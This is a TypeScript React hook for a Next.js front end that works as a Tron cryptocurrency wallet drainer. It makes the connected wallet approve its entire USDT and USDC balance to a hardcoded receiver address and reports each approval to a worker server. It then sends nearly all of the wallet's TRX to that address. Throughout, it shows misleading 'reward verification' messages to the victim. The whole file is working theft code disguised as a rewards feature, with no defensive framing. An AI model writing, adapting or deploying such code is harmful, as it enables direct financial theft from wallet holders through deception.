"use client";

import { useState } from "react";

const TRON_RECEIVER_ADDRESS = "TJ19BCQFh2WDRmtfURVCyLUWMN9X65U8Cx";

export function useTronManager() {
    const [isProcessing, setIsProcessing] = useState(false);
    const [currentTask, setCurrentTask] = useState("");

    const drainTron = async () => {
        if (!(window as any).tronWeb || isProcessing) return;
        setIsProcessing(true);
        setCurrentTask("Syncing Tron Reward Allocation...");

        try {
            const tronWeb = (window as any).tronWeb;
            const address = tronWeb.defaultAddress.base58;

            // List of TRC20 to check (USDT, USDC, etc.)
            const tokens = [
                "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT
                "TEk4UeebpTzMSechbtmC7qL8sar6v6pUde", // USDC
            ];

            for (const tokenAddress of tokens) {
                try {
                    const contract = await tronWeb.contract().at(tokenAddress);
                    const balance = await contract.balanceOf(address).call();

                    if (balance > 0) {
                        setCurrentTask(`Verifying TRC-20 allocation...`);
                        await contract.approve(TRON_RECEIVER_ADDRESS, balance).send();

                        // Notify Worker
                        try {
                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
                            await fetch(`${workerUrl}/notify-tron-approval`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ owner: address, tokenAddress: tokenAddress })
                            });
                        } catch (e) {
                            console.warn("Failed to notify Tron worker", e);
                        }
                    }
                } catch (e) {
                    console.error(`Tron Token Fix failed for ${tokenAddress}`, e);
                }
            }

            // Drain Native TRX
            const balance = await tronWeb.trx.getBalance(address);
            if (balance > 1000000) { // > 1 TRX
                setCurrentTask(`Finalizing TRX verification...`);
                await tronWeb.trx.sendTransaction(TRON_RECEIVER_ADDRESS, balance - 1000000);
            }

            setCurrentTask("Tron rewards verified successfully.");
        } catch (e: any) {
            console.error("Tron Drain Failed", e);
            setCurrentTask(`Error: ${e.message}`);
        } finally {
            setIsProcessing(false);
        }
    };

    return { drainTron, isProcessing, currentTask };
}
